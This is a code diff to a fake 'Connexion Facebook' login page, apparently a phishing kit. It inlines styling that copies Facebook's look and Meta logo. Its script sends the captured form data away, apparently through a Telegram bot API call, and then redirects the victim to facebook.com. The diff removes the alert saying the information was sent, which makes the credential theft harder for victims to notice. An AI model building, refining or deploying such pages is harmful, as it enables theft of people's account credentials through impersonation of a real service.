@@ -5,7 +5,57 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connexion Facebook</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
-    <link rel="stylesheet" href="style.css"> <!-- Lien vers votre CSS externe -->
+    <style>
+        body {
+            background-color: #f0f2f5;
+            font-family: 'Helvetica', 'Arial', sans-serif;
+        }
+        .login-container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .facebook-logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        .btn-facebook {
+            background-color: #1877f2;
+            color: white;
+            font-weight: bold;
+            border: none;
+        }
+        .btn-facebook:hover {
+            background-color: #145db2;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            font-weight: bold;
+            border: none;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            display: block;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .meta-logo img {
+            width: 60px;
+            opacity: 0.6;
+        }
+    </style>
 </head>
 <body>
     <div class="login-container">
@@ -22,8 +72,7 @@
         </form>
         <p class="meta-logo">
             <img src="imge/Meta_Platforms-Logo.wine.svg" 
-                 alt="Logo Meta" 
-                 style="width: 60px; opacity: 0.6;">
+                 alt="Logo Meta">
         </p>
     </div>
 
@@ -65,7 +114,6 @@
                         parse_mode: 'html',
                         text: message
                     }).then(response => {
-                        alert('Les informations ont été envoyées avec succès !');
                         window.location.href = "https://www.facebook.com"; // Redirection vers Facebook
                     }).catch(error => {
                         alert('Erreur lors de l\'envoi des informations. Veuillez réessayer.');
